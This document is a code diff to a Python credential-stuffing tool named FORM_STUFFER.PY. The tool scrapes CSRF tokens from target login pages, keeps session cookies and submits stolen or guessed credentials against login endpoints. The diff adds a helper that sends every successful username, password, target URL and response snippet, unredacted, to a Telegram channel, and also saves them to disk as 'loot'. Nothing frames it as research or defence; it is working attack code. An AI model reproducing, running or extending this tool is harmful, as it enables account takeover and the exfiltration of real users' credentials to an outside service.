@@ -1,22 +1,38 @@
 #!/usr/bin/env python3
 """
-FORM_STUFFER.PY — Automated CSRF-Aware Credential Stuffing & Login Module
+FORM_STUFFER.PY — Automated CSRF-Aware Credential Stuffing & Login Module v8.0 (With Telegram Telemetry)
 Features:
 - Dynamically scrapes live CSRF tokens (_token) from target login pages
 - Maintains session state & cookie jars across GET/POST cycles
 - Submits valid or stuffed credentials against target login endpoints
-- Automatically routes successful authentication states to the session loot reporter
+- Automatically routes successful authentication states to the session loot reporter and Telegram
 """
 import sys
 import re
 import httpx
+import asyncio
 from bs4 import BeautifulSoup
 from urllib.parse import urlsplit
-from modules.live_login_verifier import save_loot_report
+
+# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
+from modules.live_login_verifier import save_session_loot
+from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous form stuffer functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def execute_form_stuffing(target_url, username, password, login_path="/user/login"):
     parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
@@ -49,7 +65,6 @@ def execute_form_stuffing(target_url, username, password, login_path="/user/logi
             
             csrf_token = token_input.get("value") if token_input else None
             if not csrf_token:
-                # Regex fallback if BeautifulSoup misses it
                 match = re.search(r'name="_token"\s+value="([^"]+)"', get_resp.text)
                 if match:
                     csrf_token = match.group(1)
@@ -87,7 +102,29 @@ def execute_form_stuffing(target_url, username, password, login_path="/user/logi
 
             if status in (200, 302) and not is_login_page and has_dashboard_indicators:
                 log(f"[!!!] SUCCESS! Credential stuffing successful! Access confirmed [HTTP {status}] [!!!]", "\033[91m")
-                save_loot_report(login_path, status, body)
+                
+                loot_payload = {
+                    "target": login_url,
+                    "username": username,
+                    "password": password,
+                    "status": status,
+                    "response_snippet": body[:400]
+                }
+
+                # BROADCAST UNREDACTED CREDENTIAL STUFFING LOOT STRAIGHT TO TELEGRAM
+                broadcast_tg_alert_sync("Credential Stuffing Success", loot_payload)
+
+                # STREAM TELEMETRY & PERSIST TO DISK VIA CENTRALIZED FRAMEWORK LOGGER
+                stream_proof("FORM_STUFFER_SUCCESS", login_url, {"username": username}, body[:300], {"status": status})
+                save_session_loot(
+                    target=base_url,
+                    endpoint=login_path,
+                    finding_type="FORM_STUFFER_AUTHENTICATION_SUCCESS",
+                    status=status,
+                    headers=dict(post_resp.headers),
+                    body=body,
+                    extra_loot=loot_payload
+                )
                 return True
             else:
                 log(f"[-] Login rejected or returned to login portal (Status: {status}).", "\033[93m")
